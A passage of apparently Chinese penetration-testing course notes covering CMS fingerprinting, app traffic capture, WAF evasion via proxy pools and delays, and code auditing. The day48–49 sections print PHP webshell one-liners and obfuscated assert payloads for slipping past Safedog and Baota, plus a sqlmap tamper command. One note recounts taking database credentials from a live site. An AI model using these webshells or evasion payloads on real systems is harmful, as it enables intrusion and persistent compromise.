thinkphp</span><br><span class="line">	java</span><br><span class="line">		Shiro Struts Spring Maven</span><br><span class="line">	python</span><br><span class="line">		Flask Django Tornado</span><br><span class="line">未知cms</span><br><span class="line">	工具框架</span><br><span class="line">		xray awvs appscan</span><br><span class="line">	人工探针</span><br><span class="line">		应用功能 URL参数 盲猜参数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 币圈cms</span><br><span class="line">fofa搜索index/login/login			--》thinkphp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#vulhub搜索spring</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#墨者靶场wordpress插件漏洞分析溯源</span><br><span class="line">首先cms识别</span><br><span class="line">	在线识别</span><br><span class="line">	数据包提取路径去搜</span><br><span class="line">	从网页去找版权</span><br><span class="line">	使用cms探测工具 wpscan特殊功能要花钱买token</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#代码审计使用Seay工具</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#668jq.com		#买挂网站		现在没了</span><br><span class="line">cms识别--》dedecms</span><br><span class="line">/robots.txt</span><br><span class="line">/data/admin/ver.txt --》版本</span><br><span class="line">网上的漏洞比较鸡肋</span><br><span class="line">/dede		下载数据库备份   从中搜索后台路径</span><br><span class="line">弱口令测试</span><br><span class="line">扫端口  --》8888宝塔  -》宝塔漏洞没用</span><br><span class="line">备份文件  路径没提供 --》从数据库配置文件中获取密码用户名</span><br><span class="line">使用Navicat数据库连接工具连接			-》宝塔设置不让连接</span><br><span class="line">又从备份文件找到别的数据库的用户名密码，连接成功</span><br></pre></td></tr></table></figure>

<h3 id="day44-APP应用之漏洞探针类型利用修复"><a href="#day44-APP应用之漏洞探针类型利用修复" class="headerlink" title="day44-APP应用之漏洞探针类型利用修复"></a>day44-APP应用之漏洞探针类型利用修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app应用</span><br><span class="line">	抓包</span><br><span class="line">		http/https</span><br><span class="line">			burpsuite charles fiddler 抓包精灵 其他</span><br><span class="line">		其他协议</span><br><span class="line">			wireshark</span><br><span class="line">	协议</span><br><span class="line">		WEB协议类</span><br><span class="line">		其他协议类</span><br><span class="line">	逆向</span><br><span class="line">		一键提取apk设计URL</span><br><span class="line">		反编译重写代码段编译测试</span><br><span class="line"></span><br><span class="line">一阵乱点获取url</span><br><span class="line">burpsuite history旁边的空白单机可以设置过滤</span><br><span class="line">抓包精灵是app</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏了个大洞 逆向</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#xray</span><br><span class="line">	手机模拟器代理端口192.168.0.101:8888，burpsuite监听这个端口</span><br><span class="line">	然后burpsuite user options中upstream Proxy Servers设置转发数据包，*表示所有都转发，转发到127.0.0.1:6666端口</span><br><span class="line">	最后xray监听本地6666端口</span><br></pre></td></tr></table></figure>

<h3 id="day45-API接口服务之漏洞探针类型利用修复"><a href="#day45-API接口服务之漏洞探针类型利用修复" class="headerlink" title="day45-API接口服务之漏洞探针类型利用修复"></a>day45-API接口服务之漏洞探针类型利用修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#端口服务类-Tomcat弱口令安全问题</span><br><span class="line">vulhub</span><br><span class="line">/tomcat/tomcat8 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#端口服务类-Glassfish任意文件读取</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其他补充类-基于端口WEB站点测试</span><br><span class="line">不同端口站点不同</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其他补充类-基于域名WEB站点测试</span><br><span class="line">注册人 域名等级 特有信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#其他补充类-基于IP配合端口信息收集</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#口令安全脚本工具简要使用-Snetcracker</span><br><span class="line">弱口令爆破工具，支持多种协议，国内人写的</span><br><span class="line">hydra国外人写的	脚本命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#API接口类-网络服务类探针利用测试-AWVS</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\640-1688030924215.png" alt="图片"> </p>
<h3 id="day46-WAF绕过-信息收集之反爬虫延时代理池技术"><a href="#day46-WAF绕过-信息收集之反爬虫延时代理池技术" class="headerlink" title="day46-WAF绕过-信息收集之反爬虫延时代理池技术"></a>day46-WAF绕过-信息收集之反爬虫延时代理池技术</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAF拦截会出现在安全测试的各个层面</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">信息收集</span><br><span class="line">	测试环境</span><br><span class="line">		aliyun-os BT(baota) safedog</span><br><span class="line">	绕过分析</span><br><span class="line">		抓包技术 WAF说明 FUZZ测试</span><br><span class="line">	绕过手法</span><br><span class="line">		数据包特征</span><br><span class="line">			请求方式 模拟用户 爬虫引擎 白名单机制</span><br><span class="line">		请求速度</span><br><span class="line">			延时 代理池 爬虫引擎 白名单机制 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Safedog-默认拦截机制分析绕过-未开CC</span><br><span class="line">	目录爆破--》会误报全是200			铸剑实战靶场内部版</span><br><span class="line">	分析数据包，实际的抓取的数据包的不同--》请求方式head改get</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#Safedog-默认拦截机制分析绕过-开启CC</span><br><span class="line">	安全狗CC防护规则</span><br><span class="line">		单用户访问上限</span><br><span class="line">		代理访问上限</span><br><span class="line">		会话验证</span><br><span class="line">	使用延时的方法</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#Aliyun_OS-默认拦截机制分析绕过-简要界面</span><br><span class="line">	阿里云无法模拟搜索引擎爬虫绕过，只能采用代理池或延时</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#BT(防火墙插件)-默认拦截机制分析绕过-简要界面</span><br><span class="line">	花钱 apach50块</span><br><span class="line">	爬虫未知 延迟可以 代理池可以</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#aliyun bt safedog防护体系</span><br><span class="line">	延迟3秒	阿里云限制的</span><br><span class="line">	宝塔60秒内累计6次恶意请求封锁ip600秒</span><br><span class="line">		字典重新排序</span><br><span class="line">		截断 index.php.bak. .之类</span><br></pre></td></tr></table></figure>

<h3 id="day47-WAF绕过-漏洞发现之代理池指纹被动探针"><a href="#day47-WAF绕过-漏洞发现之代理池指纹被动探针" class="headerlink" title="day47-WAF绕过-漏洞发现之代理池指纹被动探针"></a>day47-WAF绕过-漏洞发现之代理池指纹被动探针</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">漏洞发现</span><br><span class="line">	工具</span><br><span class="line">		综合</span><br><span class="line">			awvs(Acunetix) xray appacan</span><br><span class="line">		单点</span><br><span class="line">			tpscan wpscan st2scan</span><br><span class="line">	触发</span><br><span class="line">		扫描速度</span><br><span class="line">			延时 代理池 白名单</span><br><span class="line">		工具指纹</span><br><span class="line">			特征修改 模拟用户</span><br><span class="line">		漏洞PayLoad</span><br><span class="line">			数据变异 冷门扫描</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#代理池Proxy_pool项目搭建及使用解释</span><br><span class="line">	python项目redis数据库 b站搜proxy_pool</span><br><span class="line">#充钱代理池safedog+bt+Aliyun探针</span><br><span class="line">	kuaidaili.com</span><br><span class="line">		选购隧道代理，每次请求都会换ip 20/天</span><br><span class="line">#Safedog-awvs漏扫注入测试绕过-延时，白名单</span><br><span class="line">	白名单爬虫搜索引擎</span><br><span class="line">#Aliyun_os-awvs漏扫注入测试绕过-延时白名单</span><br><span class="line">#BT(baota)-awvs+xray漏扫Payload绕过-演示被动</span><br><span class="line">#充钱代理池直接干Safedog+BT+AliyunOS漏洞发现</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#充钱换代理池可以基本解决扫描目录的问题</span><br></pre></td></tr></table></figure>

<h3 id="day48-WAF绕过-权限绕过之代码混淆及行为造轮子"><a href="#day48-WAF绕过-权限绕过之代码混淆及行为造轮子" class="headerlink" title="day48-WAF绕过-权限绕过之代码混淆及行为造轮子"></a>day48-WAF绕过-权限绕过之代码混淆及行为造轮子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">权限控制</span><br><span class="line">	脚本</span><br><span class="line">		ASP PHP ASPX PY.WAR等</span><br><span class="line">	工具</span><br><span class="line">		菜刀 蚁剑 冰蝎</span><br><span class="line">	代码</span><br><span class="line">		加密混淆 变量覆盖 异或生成</span><br><span class="line">	行为</span><br><span class="line">		指纹变异 自写轮子</span><br><span class="line">	检测</span><br><span class="line">		常规安全工具脚本使用</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试环境为安全狗+宝塔+阿里云</span></span><br><span class="line"><span class="comment">#变量覆盖</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;z&#x27;</span>]);</span><br><span class="line"><span class="comment">//?x=b&amp;y=assert		post中z=phpinfo();	可以绕过安全狗的变量追踪</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1668433978904.png" alt="1668433978904"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">上述一句话可以绕过安全狗，但是绕不过宝塔，phpinfo是风险值，加入base64编码</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;x&#x27;];</span><br><span class="line">$$a=$_GET[&#x27;y&#x27;];</span><br><span class="line">$b(base64_decode($_POST[&#x27;z&#x27;]));</span><br><span class="line">//?x=b&amp;y=assert 	post中z=cGhwaW5mbygpOw==			绕过宝塔</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#加密混淆</span><br><span class="line">http://www.phpjiami.com/</span><br><span class="line">加密后有乱码但是有能正常执行</span><br><span class="line">没有可读性，安全狗宝塔阿里云解密不了不拦截</span><br><span class="line">#异或生生成 python ^ 异或</span><br><span class="line">github项目webshell-venom自动webshell混淆		直接复制通杀</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1668436363889.png" alt="1668436363889"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传参先判断是否有id决定是是不是base64解密</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#蚁剑连接上面有编码器可以选到base64</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#菜刀，蚁剑，冰蝎优缺点	xiaodi推崇冰蝎</span><br><span class="line">菜刀	未更新状态，无插件，单向加密传输</span><br><span class="line">蚁剑	更新状态，有插件，拓展性强，单向加密传输</span><br><span class="line">冰蝎	更新状态，未知插件，双向加密传输(返回数据包同样加密)</span><br><span class="line">	冰蝎有后渗透的模块</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件的名字也改一下，不要shell.php这种</span><br><span class="line">#进一步操作被发现冰蝎蚁剑指纹</span><br><span class="line">#回显包的数据如果没有加密容易被发现问题</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#下图为base64加密覆盖的 注意password为z path要用：分割</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1668440278281.png" alt="1668440278281"></p>
<h3 id="day49-WAF绕过-漏洞利用之注入上传跨站等绕过"><a href="#day49-WAF绕过-漏洞利用之注入上传跨站等绕过" class="headerlink" title="day49-WAF绕过-漏洞利用之注入上传跨站等绕过"></a>day49-WAF绕过-漏洞利用之注入上传跨站等绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 sqllab 安全狗</span><br><span class="line">#一些绕过经验</span><br><span class="line">使用代理池	花钱隧道代理</span><br><span class="line">sqlmap UA头换掉</span><br><span class="line">--tamper rdog.py自己模仿写一个在注入语句中替换一些绕过语句</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://...../sqlilabs/Less-2/?id=1&quot; --proxy=&quot;http://tps123.kdlapi.com&quot; --tamper=rdog.py --user-agent=&quot;.....&quot;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1668520828721.png" alt="1668520828721"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 sqllab 安全狗+宝塔</span><br><span class="line">宝塔会对 /* 过滤</span><br><span class="line">%00/*	可以绕过 %00截断之后的宝塔看不到  在--tamper的rdog.py文件加 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 pikachu 文件上传</span><br><span class="line">截断就完事?		看前面的</span><br><span class="line">x.p</span><br><span class="line">h</span><br><span class="line">p</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 pikachu rce</span><br><span class="line">宝塔过滤base64_decode(</span><br><span class="line">可逆加密只有url编码 base64编码 hex编码</span><br><span class="line">hex好像可以</span><br><span class="line">$str = &quot;phpinfo();&quot;</span><br><span class="line">$hex = bin2hex($hex);</span><br><span class="line">echo pack(”H*&quot;,$hex)		#此处还原出phpinf();的字符格式</span><br><span class="line">post中</span><br><span class="line">txt=$hex=&#x27;.....&#x27;;assert(pack(&quot;H*&quot;,$hex));</span><br><span class="line">txt=$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,pxhxpxixnxfxo());assert($y);</span><br><span class="line">#如果拦截assert用提交方式写进来</span><br><span class="line">txt=$x=&#x27;ass&#x27;;$xx=&#x27;ert&#x27;;$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,pxhxpxixnxfxo());$xxx($y);</span><br><span class="line">#$_GET被宝塔过滤可以换成$_REQUEST</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#测试环境 pikachu 文件包含</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php.ini</span><br><span class="line">safe_mode</span><br><span class="line">disable_functions</span><br><span class="line">这俩会禁用执行函数</span><br></pre></td></tr></table></figure>

<h3 id="day50-代码审计-PHP无框架项目SQL注入挖掘技巧"><a href="#day50-代码审计-PHP无框架项目SQL注入挖掘技巧" class="headerlink" title="day50-代码审计-PHP无框架项目SQL注入挖掘技巧"></a>day50-代码审计-PHP无框架项目SQL注入挖掘技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">工具</span><br><span class="line">	fortify</span><br><span class="line">		网盘下载，xiaodi8.com有破解教程</span><br><span class="line">	seay	中文</span><br><span class="line">必备知识点</span><br><span class="line">	环境安装搭建使用 相关工具插件安装 前期各种漏洞原理及利用</span><br><span class="line">开始前准备</span><br><span class="line">	审计程序名 版本 当前环境（系统，中间件，脚本语言等信息） 各种插件</span><br><span class="line">代码审计挖掘漏洞根本</span><br><span class="line">	可控变量</span><br><span class="line">		变量接受</span><br><span class="line">	特定函数</span><br><span class="line">		比如echo print尝试找xss</span><br><span class="line">	不存在过滤或过滤不严谨存在绕过导致安全漏洞</span><br><span class="line">	定点挖掘功能点</span><br><span class="line">		挖掘文件上传 会员中心存在文件上传的操作地址 抓包分析找到源码中特定文件代码段 进行文件上传代码分析</span><br><span class="line">	sql注入 数据库监控-监控到当前页面和数据库交互过程（SQL执行语句）</span><br><span class="line">	断点调试 访问页面对应代码进行断点调试（执行过程前后顺序 调用文件列表等）</span><br><span class="line"></span><br><span class="line">magic_...?</span><br><span class="line">	宽字节</span><br><span class="line">	二次注入</span><br><span class="line">		类似会员中心修改信息的模块 insert update 变量可控</span><br></pre></td></tr></table></figure>

<h3 id="day51-代码审计-PHP框架MVC类上传断点调式挖掘"><a href="#day51-代码审计-PHP框架MVC类上传断点调式挖掘" class="headerlink" title="day51-代码审计-PHP框架MVC类上传断点调式挖掘"></a>day51-代码审计-PHP框架MVC类上传断点调式挖掘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.关键字搜索 函数 键字 全局变量</span><br><span class="line">	e.g.	文件上传 $_FILES move_uploaded_file</span><br><span class="line">	https://blog.csdn.net/haoyunyun888/article/details/81079274</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bees搭建 /BEES/install按提示 后台管理admin admin 数据库root root</span><br><span class="line">	很多cms后台功能更多</span><br><span class="line">	/BEES/admin/admin_file_upload.php	经过初步审计没有上传漏洞，试了截断</span><br><span class="line">	/BEES/admin/admin_pic_upload.php	此处是检测MIME类型可以绕过，存在漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#断点调试</span><br><span class="line">phpstorm		类似pycharm ideal</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#MVC the model view controller architecture</span><br><span class="line">model 管理大部分业务逻辑和所有数据库逻辑 模型提供连接和操作数据库抽象层</span><br><span class="line">controller 负责响应用户请求 准备数据 以及决定如何展示这些数据</span><br><span class="line">view 渲染数据 通过html呈现给用户</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1668753526565.png" alt="1668753526565"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#php5</span><br><span class="line">做成框架的mvc</span><br></pre></td></tr></table></figure>

<h3 id="day55-代码审计-java项目注入上传搜索或插件挖掘"><a href="#day55-代码审计-java项目注入上传搜索或插件挖掘" class="headerlink" title="day55-代码审计-java项目注入上传搜索或插件挖掘"></a>day55-代码审计-java项目注入上传搜索或插件挖掘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">审计技术</span><br><span class="line">	全局搜索 ctrl+shift+F</span><br><span class="line">	引用追踪 alt+f7或者查找引用</span><br><span class="line">	功能定点 配合burp定位代码文件</span><br><span class="line">	插件分析 fortify扫描 idea+findbugs</span><br><span class="line">审计方向</span><br><span class="line">	代码分析</span><br><span class="line">		常规</span><br><span class="line">		非常规</span><br><span class="line">	开发框架</span><br><span class="line">		shiro</span><br><span class="line">		maven</span><br><span class="line">		spring</span><br><span class="line">		struts</span><br><span class="line">		mybatis</span><br><span class="line">		springmvc</span><br><span class="line">	中间件容器 </span><br><span class="line">		jetty</span><br><span class="line">		jboss</span><br><span class="line">		tomcat</span><br><span class="line">		weblogic</span><br><span class="line">		webshere</span><br><span class="line">		glassfish</span><br><span class="line">审计漏洞 参考webgoat</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\image-20230515100414175.png" alt="image-20230515100414175"></p>
<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\image-20230515100541027.png" alt="image-20230515100541027"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javaweb执行流程</span><br><span class="line">https://www.cnblogs.com/1987721594zy/p/9186584.html</span><br><span class="line">https://blog.csdn.net/weily11/article/details/80643472</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1200305-20180615104548781-252441748.png" alt="1200305-20180615104548781-252441748"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">com 公司项目 copyright由项目发起的公司所有</span><br><span class="line">包名 com.公司名.项目名.模块名</span><br><span class="line">持久层 dao persist mapper</span><br><span class="line">实体层 entity model bean javabean pojo</span><br><span class="line">业务逻辑 service biz</span><br><span class="line">控制器 controller servlet action web</span><br><span class="line">过滤器 filter</span><br><span class="line">异常 exception</span><br><span class="line">监听器 listener</span><br><span class="line">在不同框架下一般包的命名规则不同，但大概如上，不同功能的java文件放在不同的包中，根据java文件的功能统一安放及命名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">审计思路</span><br><span class="line">	根据业务逻辑功能审计优点</span><br><span class="line">	明确程序的架构以及业务逻辑，明确数据流向</span><br><span class="line">	获取参数-&gt;表现层-&gt;业务层-&gt;持久层 